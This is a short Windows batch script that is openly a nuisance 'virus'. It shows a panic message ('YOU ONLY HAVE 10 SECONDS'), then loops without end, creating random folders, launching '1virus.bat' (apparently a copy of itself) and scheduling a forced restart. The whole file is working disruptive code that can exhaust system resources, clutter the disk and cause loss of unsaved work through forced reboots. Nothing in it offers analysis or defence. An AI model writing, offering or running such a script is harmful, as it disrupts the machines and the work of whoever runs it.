@echo off
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 10 SECONDS!&echo(&pause"
:Admin
mkdir %Random%
start 1virus.bat
shutdown -r -t 10
goto Admin
